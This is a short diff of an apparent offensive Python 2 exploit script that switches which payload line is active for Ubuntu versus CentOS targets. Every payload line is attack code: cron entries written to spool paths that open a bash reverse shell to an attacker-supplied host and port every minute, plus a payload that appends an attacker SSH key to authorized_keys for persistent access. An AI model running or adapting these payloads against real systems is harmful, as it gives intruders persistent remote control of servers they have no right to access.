@@ -118,8 +118,8 @@ if __name__ == "__main__":
             key = 1
             
     if isset('lhsot') and isset('lport'):
-        #payload = '/bin/bash -c "echo \\\"*/1 * * * * root /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
-        payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
+        payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
+        #payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
         print "[-]Paylaod: "+payload
     if sshkey !='' and key == 1:
         payload = '/bin/bash -c "echo \\\"'+sshkey+'\\\" >> /tmp1/.ssh/authorized_keys"'
